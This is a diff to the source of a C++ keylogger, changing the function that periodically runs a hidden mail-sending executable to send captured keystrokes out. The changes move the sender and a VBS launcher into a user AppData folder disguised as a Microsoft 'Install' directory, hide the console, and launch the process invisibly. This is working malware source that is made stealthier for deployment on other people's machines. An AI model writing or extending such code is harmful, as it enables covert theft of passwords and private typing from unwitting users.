@@ -12,7 +12,7 @@
 #include "Timer.h"
 
 std::string keylog = "";
-int timer_time = 500;
+int timer_time = 500;//30 seconds
 
 void TimerSendMail()
 {
@@ -28,10 +28,17 @@ void TimerSendMail()
         return;
     }
     //Send file using python script
-    //TO DO Find directory of exe
-    //TO DO Launch Python exe with no terminal
     const char* home_dir = getenv("USERPROFILE");
-    std::string dir = "C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe";
+    const char* v_dir = "\\AppData\\Roaming\\Microsoft\\Install\\activate.vbs";
+    const char* e_dir = "\\AppData\\Roaming\\Microsoft\\Install\\main.exe";
+    //Add chars together
+    char* vbs_dir = new char[strlen(home_dir)+strlen(v_dir) + 1];
+    strcpy(vbs_dir, home_dir);
+    strcat(vbs_dir, v_dir);
+    char* exe_dir = new char[strlen(home_dir)+strlen(e_dir) + 1];
+    strcpy(exe_dir, home_dir);
+    strcat(exe_dir, e_dir);
+
     ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
     FreeConsole();
     //system("explorer C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe");
@@ -40,9 +47,9 @@ void TimerSendMail()
     shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
     shExecInfo.hwnd = NULL;
     shExecInfo.lpVerb = "open";
-    shExecInfo.lpFile = "C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\main.exe";
+    shExecInfo.lpFile = exe_dir;
     shExecInfo.lpParameters = NULL;
-    shExecInfo.lpDirectory = "C:\\CodingProjects\\C++\\Keylogger-main\\Keylogger\\mail_sending\\activate.vbs";
+    shExecInfo.lpDirectory = vbs_dir;
     shExecInfo.nShow = SW_HIDE;//Visibility off
     shExecInfo.hInstApp = NULL;
     //Execute
